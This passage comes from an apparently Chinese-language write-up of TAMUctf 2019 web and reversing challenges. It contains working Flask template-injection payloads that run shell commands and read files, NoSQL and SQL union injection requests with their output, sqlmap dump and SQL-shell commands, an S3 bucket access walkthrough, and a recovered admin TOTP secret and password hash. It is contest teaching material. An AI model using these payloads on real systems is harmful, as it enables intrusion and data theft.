class="line"><span class="string">gigem&#123;continued == source_and_"</span></span><br><span class="line">gigem&#123;_continued=source_and_<span class="string">"</span></span><br><span class="line"><span class="string">gigem&#123;_continued=source_and_"</span></span><br><span class="line"></span><br><span class="line">$ curl http://web7.tamuctf.com/cook.js</span><br><span class="line">document.cookie = <span class="string">"gigem_continue=cookies&#125;; expires=Thu, 18 Dec 2020 12:00:00 UTC"</span>;</span><br><span class="line">document.cookie = <span class="string">"hax0r=flagflagflagflagflagflag; expires=Thu, 18 Dec 2020 12:00:00 UTC"</span>;</span><br><span class="line">document.cookie = <span class="string">"gigs=all_the_cookies; expires=Thu, 18 Dec 2020 12:00:00 UTC"</span>;</span><br><span class="line">document.cookie = <span class="string">"cookie=flagcookiegigemflagcookie; expires=Thu, 18 Dec 2020 12:00:00 UTC"</span>;</span><br></pre></td></tr></table></figure><p>几个页面相关的内容连起来得到flag为<code>gigem{flag_in_source_and_cookies</code> 。这个题目意思不大。</p><h2 id="Science"><a href="#Science" class="headerlink" title="Science!"></a>Science!</h2><blockquote><p><a href="http://web3.tamuctf.com/" target="_blank" rel="noopener">http://web3.tamuctf.com</a></p><p>Difficulty: medium</p></blockquote><p>flask的SSTI。</p><p>命令执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&apos;&apos;.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.linecache.os.popen(&apos;ls -Rhl&apos;).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="1552741313918.png" alt="1552741313918"></p><p>文件读取</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="string">''</span>.__class__.__mro__[2].__subclasses__()[40](<span class="string">'flag.txt'</span>).<span class="built_in">read</span>()&#125;&#125;</span><br></pre></td></tr></table></figure><p><code>gigem{5h3_bl1nd3d_m3_w17h_5c13nc3}</code> </p><p>views.py内容</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> tamuctf <span class="keyword">import</span> app</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, request, jsonify, render_template_string</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="meta">@app.route('/index')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/science', methods=['POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">science</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        chem1 = request.form[<span class="string">'chem1'</span>]</span><br><span class="line">        chem2 = request.form[<span class="string">'chem2'</span>]</span><br><span class="line">        template = <span class="string">'''&lt;html&gt;</span></span><br><span class="line"><span class="string">        &lt;div style="text-align:center"&gt;</span></span><br><span class="line"><span class="string">        &lt;h3&gt;The result of combining &#123;&#125; and &#123;&#125; is:&lt;/h3&gt;&lt;/br&gt;</span></span><br><span class="line"><span class="string">        &lt;iframe src="https://giphy.com/embed/AQ2tIhLp4cBa" width="468" height="480" frameBorder="0" class="giphy-embed" allowFullScreen&gt;&lt;/iframe&gt;&lt;/div&gt;</span></span><br><span class="line"><span class="string">        &lt;/html&gt;'''</span>.format(chem1, chem2)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> render_template_string(template, dir=dir, help=help, locals=locals)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Something went wrong"</span></span><br></pre></td></tr></table></figure><p>参考文章：</p><ul><li><a href="Flask/Jiaja2 SSTI">Flask/Jiaja2 SSTI</a> </li><li><a href="https://www.kingkk.com/2018/06/Flask-Jinja2-SSTI-python-%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/" target="_blank" rel="noopener">Flask/Jinja2 SSTI &amp;&amp; python 沙箱逃逸</a>  </li></ul><h2 id="Buckets"><a href="#Buckets" class="headerlink" title="Buckets"></a>Buckets</h2><blockquote><p>Checkout my s3 bucket website!<br><a href="http://tamuctf.s3-website-us-west-2.amazonaws.com/" target="_blank" rel="noopener">http://tamuctf.s3-website-us-west-2.amazonaws.com/</a></p><p>Difficulty: easy</p></blockquote><p>亚马逊云存储器S3 BUCKET未授权访问。</p><p>从链接知bucket name为<code>tamuctf</code> ，访问<code>http://tamuctf.s3.amazonaws.com/</code> ，</p><p>在页面中搜索发现<code>Dogs/CC2B70BD238F48BE29D8F0D42B170127/CBD2DD691D3DB1EBF96B283BDC8FD9A1/flag.txt</code> ，</p><p>访问<code>http://tamuctf.s3.amazonaws.com/Dogs/CC2B70BD238F48BE29D8F0D42B170127/CBD2DD691D3DB1EBF96B283BDC8FD9A1/flag.txt</code> ，</p><p>得到flag为<code>flag{W0W_S3_BAD_PERMISSIONS}</code> 。</p><p>参考文章：</p><ul><li><a href="https://www.freebuf.com/articles/web/135313.html" target="_blank" rel="noopener">针对亚马逊云存储器S3 BUCKET的渗透测试</a> </li><li><a href="https://www.anquanke.com/post/id/86927" target="_blank" rel="noopener">【技术分享】AWS渗透测试（Part 1）：S3 Buckets</a> </li><li><a href="https://docs.aws.amazon.com/zh_cn/cli/latest/userguide/cli-chap-configure.html" target="_blank" rel="noopener">配置 AWS CLI</a> </li></ul><h2 id="Login-App"><a href="#Login-App" class="headerlink" title="Login App"></a>Login App</h2><blockquote><p><a href="http://web4.tamuctf.com/" target="_blank" rel="noopener">http://web4.tamuctf.com</a></p><p>Difficulty: medium</p></blockquote><p>页面源码有一段JavaScript</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    $(<span class="string">"#submit"</span>).on(<span class="string">'click'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        $.ajax(&#123;</span><br><span class="line">            url: <span class="string">'login'</span>, </span><br><span class="line">            type : <span class="string">"POST"</span>, </span><br><span class="line">            dataType : <span class="string">'json'</span>, </span><br><span class="line">            data : <span class="built_in">JSON</span>.stringify(&#123;<span class="string">"username"</span>: $(<span class="string">"#username"</span>).val(), <span class="string">"password"</span>: $(<span class="string">"#password"</span>).val()&#125;),</span><br><span class="line">            contentType: <span class="string">'application/json;charset=UTF-8'</span>,</span><br><span class="line">            success : <span class="function"><span class="keyword">function</span>(<span class="params">result</span>) </span>&#123;</span><br><span class="line">                $(<span class="string">".result"</span>).html(result);</span><br><span class="line">                <span class="built_in">console</span>.log(result);</span><br><span class="line">                alert(result);</span><br><span class="line">            &#125;,</span><br><span class="line">            error: <span class="function"><span class="keyword">function</span>(<span class="params">xhr, resp, text</span>) </span>&#123;</span><br><span class="line">                $(<span class="string">".result"</span>).html(<span class="string">"Something went wrong"</span>); </span><br><span class="line">                <span class="built_in">console</span>.log(xhr, resp, text);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;);</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure><p>NoSQL注入。</p><p>报文：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">POST /login HTTP/1.1</span><br><span class="line">Host: web4.tamuctf.com</span><br><span class="line">Content-Length: 50</span><br><span class="line">Accept: text/plain</span><br><span class="line">Content-Type: application/json;charset=UTF-8</span><br><span class="line">Referer: http://web4.tamuctf.com/admin</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">&#123;<span class="string">"username"</span>:&#123;<span class="string">"<span class="variable">$eq</span>"</span>:<span class="string">"admin"</span>&#125;,<span class="string">"password"</span>:&#123;<span class="string">"<span class="variable">$gt</span>"</span>:<span class="string">""</span>&#125;&#125;</span><br></pre></td></tr></table></figure><p>或</p><p><img src="1552746047220.png" alt="1552746047220"></p><p>或</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">curl -H <span class="string">'Content-Type: application/json; charset=UTF-8'</span> -X POST --data <span class="string">'&#123;"username":&#123;"$ne":"nosql"&#125;,"password":&#123;"$ne":"injection"&#125;&#125;'</span> http://web4.tamuctf.com/login</span><br><span class="line"><span class="string">"Welcome: bob!"</span></span><br><span class="line"></span><br><span class="line">curl -H <span class="string">'Content-Type: application/json; charset=UTF-8'</span> -X POST --data <span class="string">'&#123;"username":&#123;"$ne":"bob"&#125;,"password":&#123;"$ne":"injection"&#125;&#125;'</span> http://web4.tamuctf.com/login</span><br><span class="line"><span class="string">"Welcome: admin!\ngigem&#123;n0_sql?_n0_pr0bl3m_8a8651c31f16f5dea&#125;"</span></span><br></pre></td></tr></table></figure><p>参考文章：</p><p><a href="https://www.freebuf.com/articles/database/95314.html" target="_blank" rel="noopener">一个有趣的实例让NoSQL注入不再神秘</a> </p><h2 id="Bird-Box-Challenge"><a href="#Bird-Box-Challenge" class="headerlink" title="Bird Box Challenge"></a>Bird Box Challenge</h2><blockquote><p><a href="http://web2.tamuctf.com" target="_blank" rel="noopener">http://web2.tamuctf.com</a></p><p>We’ve got Aggies, Trucks, and Eggs!</p><p>Difficulty: hard</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">neo@o:~$ curl -sG --data-urlencode <span class="string">"Search=test"</span> http://web2.tamuctf.com/Search.php  | grep -o <span class="string">"&lt;h1&gt;.*&lt;/h1&gt;"</span></span><br><span class="line">&lt;h1&gt;Our search isn<span class="string">'t THAT good...&lt;/h1&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">neo@o:~$ curl -sG --data-urlencode "Search=test'</span> or 1=1<span class="comment">#" http://web2.tamuctf.com/Search.php  | grep -o "&lt;h1&gt;.*&lt;/h1&gt;"</span></span><br><span class="line">&lt;h1&gt;Nice try, nothing to see here.&lt;/h1&gt;</span><br><span class="line"></span><br><span class="line">neo@o:~$ curl -sG --data-urlencode <span class="string">"Search=test' and 1=0 union select 123 #"</span> http://web2.tamuctf.com/Search.php  | grep -o <span class="string">"&lt;h1&gt;.*&lt;/h1&gt;"</span></span><br><span class="line">&lt;h1&gt;Nope. Not gonna <span class="built_in">let</span> you use that <span class="built_in">command</span>.&lt;/h1&gt;</span><br><span class="line"></span><br><span class="line">neo@o:~$ curl -sG --data-urlencode <span class="string">"Search=test' and 1=0 union  123 #"</span> http://web2.tamuctf.com/Search.php  | grep -o <span class="string">"&lt;h1&gt;.*&lt;/h1&gt;"</span></span><br><span class="line">&lt;h1&gt;Nope. Not gonna <span class="built_in">let</span> you use that <span class="built_in">command</span>.&lt;/h1&gt;</span><br><span class="line"></span><br><span class="line">neo@o:~$ curl -sG --data-urlencode <span class="string">"Search=test' and 1=0 select  123 #"</span> http://web2.tamuctf.com/Search.php  | grep -o <span class="string">"&lt;h1&gt;.*&lt;/h1&gt;"</span></span><br><span class="line">&lt;h1&gt; Our search isn<span class="string">'t THAT good... &lt;/h1&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">neo@o:~$ curl -sG --data-urlencode "Search=test'</span>union select 123<span class="comment">#" http://web2.tamuctf.com/Search.php  | grep -o "&lt;h1&gt;.*&lt;/h1&gt;"</span></span><br><span class="line">&lt;h1&gt;123&lt;/h1&gt;</span><br><span class="line"></span><br><span class="line">neo@o:~$ curl -sG --data-urlencode <span class="string">"Search=test'union select version()#"</span> http://web2.tamuctf.com/Search.php  | grep -o <span class="string">"&lt;h1&gt;.*&lt;/h1&gt;"</span></span><br><span class="line">&lt;h1&gt;5.7.25-0ubuntu0.18.04.2&lt;/h1&gt;</span><br></pre></td></tr></table></figure><p>注入一把梭。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'UNION ALL SELECT GROUP_CONCAT(table_schema) FROM information_schema.tables WHERE table_schema != '</span>information_schema<span class="string">' #</span></span><br><span class="line"><span class="string">得到数据库名：SqliDB</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">'</span>UNION ALL SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema != <span class="string">'information_schema'</span> <span class="comment">#</span></span><br><span class="line">得到表名：Search</span><br><span class="line"></span><br><span class="line"><span class="string">'UNION ALL SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_schema != '</span>information_schema<span class="string">' #</span></span><br><span class="line"><span class="string">得到列名：items</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">'</span>UNION ALL SELECT GROUP_CONCAT(items) FROM Search <span class="comment">#</span></span><br><span class="line">得到记录：Eggs,Trucks,Aggies</span><br></pre></td></tr></table></figure><p>翻一圈啥也没有，flag不在数据库中，尝试用户名。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">neo@o:~$ curl -sG --data-urlencode &quot;Search=test&apos;union select current_user#&quot; http://web2.tamuctf.com/Search.php  | grep -o &quot;&lt;h1&gt;.*&lt;/h1&gt;&quot;</span><br><span class="line">&lt;h1&gt;gigem&#123;w3_4r3_th3_4ggi3s&#125;@localhost&lt;/h1&gt;</span><br></pre></td></tr></table></figure><p>实际上也可以直接上sqlmap。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">"http://web2.tamuctf.com/Search.php?Search=eggs"</span> -p Search --dbms mysql --random-agent --sql-shell --hex --threads 10 --proxy=http://127.0.0.1:1080</span><br></pre></td></tr></table></figure><p><img src="1552750064087.png" alt="1552750064087"></p><h2 id="1337-Secur1ty"><a href="#1337-Secur1ty" class="headerlink" title="1337 Secur1ty"></a>1337 Secur1ty</h2><blockquote><p><a href="http://web6.tamuctf.com/" target="_blank" rel="noopener">http://web6.tamuctf.com</a></p><p>Difficulty: hard</p></blockquote><p>注册用户后进入。</p><p>二维码解码结果为<code>otpauth://totp/TAMU_CTF?secret=5UGMBIONB66MCOXH</code> 。</p><p>消息是可以点击查看详情的。</p><p><img src="1552782392453.png" alt="1552782392453"></p><p>对该链接<code>http://web6.tamuctf.com/message?id=2</code> 测试注入。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u <span class="string">"http://web6.tamuctf.com/message?id=2"</span> -p id --threads 10 --dump-all --random-agent --hex</span><br></pre></td></tr></table></figure><p><img src="1552782785371.png" alt="1552782785371"></p><p>得到admin用户邮箱为<a href="mailto:`1337-admin@l337secur1ty.hak" target="_blank" rel="noopener">`1337-admin@l337secur1ty.hak</a><code>，Secret值为</code>WIFHXDZ3BOHJMJSC<code>，id为1，密码哈希为</code>02ca0b0603222a090fe2fbf3ba97d90c<code>，在somd5查询对应明文为</code>secretpasscode` 。</p><p>使用burp修改cookie后转发可见flag为<code>gigem{th3_T0tp_1s_we4k_w1tH_yoU}</code>。</p><p><img src="1552783404288.png" alt="1552783404288"></p><h1 id="Reversing"><a href="#Reversing" class="headerlink" title="Reversing"></a>Reversing</h1><h2 id="Cheesy"><a href="#Cheesy" class="headerlink" title="Cheesy"></a>Cheesy</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> Z2lnZW17M2E1eV9SM3YzcjUxTjYhfQ== | base64 -d</span><br><span class="line">gigem&#123;3a5y_R3v3r51N6!&#125;</span><br></pre></td></tr></table></figure><h2 id="Snakes-over-cheese"><a href="#Snakes-over-cheese" class="headerlink" title="Snakes over cheese"></a>Snakes over cheese</h2><p>使用<a href="https://www.toolnb.com/tools/pyc.html" target="_blank" rel="noopener">pyc在线反编译</a> 得到如下代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># uncompyle6 version 3.2.5</span></span><br><span class="line"><span class="comment"># Python bytecode 2.7 (62211)</span></span><br><span class="line"><span class="comment"># Decompiled from: Python 2.7.5 (default, Oct 30 2018, 23:45:53) </span></span><br><span class="line"><span class="comment"># [GCC 4.8.5 20150623 (Red Hat 4.8.5-36)]</span></span><br><span class="line"><span class="comment"># Embedded file name: reversing2.py</span></span><br><span class="line"><span class="comment"># Compiled at: 2018-10-08 03:28:58</span></span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime</span><br><span class="line">Fqaa = [<span class="number">102</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">103</span>, <span class="number">123</span>, <span class="number">100</span>, <span class="number">101</span>, <span class="number">99</span>, <span class="number">111</span>, <span class="number">109</span>, <span class="number">112</span>, <span class="number">105</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">125</span>]</span><br><span class="line">XidT = [<span class="number">83</span>, <span class="number">117</span>, <span class="number">112</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">83</span>, <span class="number">101</span>, <span class="number">99</span>, <span class="number">114</span>, <span class="number">101</span>, <span class="number">116</span>, <span class="number">75</span>, <span class="number">101</span>, <span class="number">121</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">'Clock.exe'</span></span><br><span class="line">    input = raw_input(<span class="string">'&gt;: '</span>).strip()</span><br><span class="line">    kUIl = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> XidT:</span><br><span class="line">        kUIl += chr(i)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> input == kUIl:</span><br><span class="line">        alYe = <span class="string">''</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> Fqaa:</span><br><span class="line">            alYe += chr(i)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">print</span> alYe</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">print</span> datetime.now()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>则Fqaa转换后为 <code>flag{decompile}</code> 。</p><h2 id="042"><a href="#042" class="headerlink" title="042"></a>042</h2><blockquote><p>Cheers for actual assembly!</p><p>#medium</p><p><a href="https://tamuctf.com/files/9cca9cf5fd2409ddb51db4841ee97617/reversing3.s" target="_blank" rel="noopener">reversing3.s</a> </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br></pre></td><td class="code"><pre><span class="line">&gt; .section__TEXT,__text,regular,pure_instructions</span><br><span class="line">&gt; .build_version macos, 10, 14</span><br><span class="line">&gt; .globl_concat                 ## -- Begin function concat</span><br><span class="line">&gt; .p2align4, 0x90</span><br><span class="line">&gt; _concat:                                ## @concat</span><br><span class="line">&gt; .cfi_startproc</span><br><span class="line">&gt; ## %bb.0:</span><br><span class="line">&gt; pushq%rbp</span><br><span class="line">&gt; .cfi_def_cfa_offset 16</span><br><span class="line">&gt; .cfi_offset %rbp, -16</span><br><span class="line">&gt; movq%rsp, %rbp</span><br><span class="line">&gt; .cfi_def_cfa_register %rbp</span><br><span class="line">&gt; subq$48, %rsp</span><br><span class="line">&gt; movq%rdi, -8(%rbp)</span><br><span class="line">&gt; movq%rsi, -16(%rbp)</span><br><span class="line">&gt; movq-8(%rbp), %rdi</span><br><span class="line">&gt; callq_strlen</span><br><span class="line">&gt; movq-16(%rbp), %rdi</span><br><span class="line">&gt; movq%rax, -32(%rbp)         ## 8-byte Spill</span><br><span class="line">&gt; callq_strlen</span><br><span class="line">&gt; movq-32(%rbp), %rsi         ## 8-byte Reload</span><br><span class="line">&gt; addq%rax, %rsi</span><br><span class="line">&gt; addq$1, %rsi</span><br><span class="line">&gt; movq%rsi, %rdi</span><br><span class="line">&gt; callq_malloc</span><br><span class="line">&gt; movq$-1, %rdx</span><br><span class="line">&gt; movq%rax, -24(%rbp)</span><br><span class="line">&gt; movq-24(%rbp), %rdi</span><br><span class="line">&gt; movq-8(%rbp), %rsi</span><br><span class="line">&gt; callq___strcpy_chk</span><br><span class="line">&gt; movq$-1, %rdx</span><br><span class="line">&gt; movq-24(%rbp), %rdi</span><br><span class="line">&gt; movq-16(%rbp), %rsi</span><br><span class="line">&gt; movq%rax, -40(%rbp)         ## 8-byte Spill</span><br><span class="line">&gt; callq___strcpy_chk</span><br><span class="line">&gt; movq-24(%rbp), %rdx</span><br><span class="line">&gt; movq%rax, -48(%rbp)         ## 8-byte Spill</span><br><span class="line">&gt; movq%rdx, %rax</span><br><span class="line">&gt; addq$48, %rsp</span><br><span class="line">&gt; popq%rbp</span><br><span class="line">&gt; retq</span><br><span class="line">&gt; .cfi_endproc</span><br><span class="line">&gt;                                         ## -- End function</span><br><span class="line">&gt; .globl_main                   ## -- Begin function main</span><br><span class="line">&gt; .p2align4, 0x90</span><br><span class="line">&gt; _main:                                  ## @main</span><br><span class="line">&gt; .cfi_startproc</span><br><span class="line">&gt; ## %bb.0:</span><br><span class="line">&gt; pushq%rbp</span><br><span class="line">&gt; .cfi_def_cfa_offset 16</span><br><span class="line">&gt; .cfi_offset %rbp, -16</span><br><span class="line">&gt; movq%rsp, %rbp</span><br><span class="line">&gt; .cfi_def_cfa_register %rbp</span><br><span class="line">&gt; subq$80, %rsp</span><br><span class="line">&gt; leaqL_.str(%rip), %rdi</span><br><span class="line">&gt; movl$3, %eax</span><br><span class="line">&gt; movl$14, %ecx</span><br><span class="line">&gt; xorl%esi, %esi</span><br><span class="line">&gt; movl$8, %edx</span><br><span class="line">&gt;                                         ## kill: def %rdx killed %edx</span><br><span class="line">&gt; leaq-16(%rbp), %r8</span><br><span class="line">&gt; movq___stack_chk_guard@GOTPCREL(%rip), %r9</span><br><span class="line">&gt; movq(%r9), %r9</span><br><span class="line">&gt; movq%r9, -8(%rbp)</span><br><span class="line">&gt; movl$0, -20(%rbp)</span><br><span class="line">&gt; movq%rdi, -56(%rbp)         ## 8-byte Spill</span><br><span class="line">&gt; movq%r8, %rdi</span><br><span class="line">&gt; movl%ecx, -60(%rbp)         ## 4-byte Spill</span><br><span class="line">&gt; movl%eax, -64(%rbp)         ## 4-byte Spill</span><br><span class="line">&gt; callq_memset</span><br><span class="line">&gt; movb$65, -16(%rbp)</span><br><span class="line">&gt; movb$53, -15(%rbp)</span><br><span class="line">&gt; movb$53, -14(%rbp)</span><br><span class="line">&gt; movb$51, -13(%rbp)</span><br><span class="line">&gt; movb$77, -12(%rbp)</span><br><span class="line">&gt; movb$98, -11(%rbp)</span><br><span class="line">&gt; movb$49, -10(%rbp)</span><br><span class="line">&gt; movb$89, -9(%rbp)</span><br><span class="line">&gt; movl$0, -28(%rbp)</span><br><span class="line">&gt; movl$1, -32(%rbp)</span><br><span class="line">&gt; movl$2, -36(%rbp)</span><br><span class="line">&gt; movl-36(%rbp), %eax</span><br><span class="line">&gt; imull-36(%rbp), %eax</span><br><span class="line">&gt; imull-36(%rbp), %eax</span><br><span class="line">&gt; movl-28(%rbp), %ecx</span><br><span class="line">&gt; addl-32(%rbp), %ecx</span><br><span class="line">&gt; addl-32(%rbp), %ecx</span><br><span class="line">&gt; addl-32(%rbp), %ecx</span><br><span class="line">&gt; imull%ecx, %eax</span><br><span class="line">&gt; cltd</span><br><span class="line">&gt; movl-60(%rbp), %ecx         ## 4-byte Reload</span><br><span class="line">&gt; idivl%ecx</span><br><span class="line">&gt; movl%eax, -40(%rbp)</span><br><span 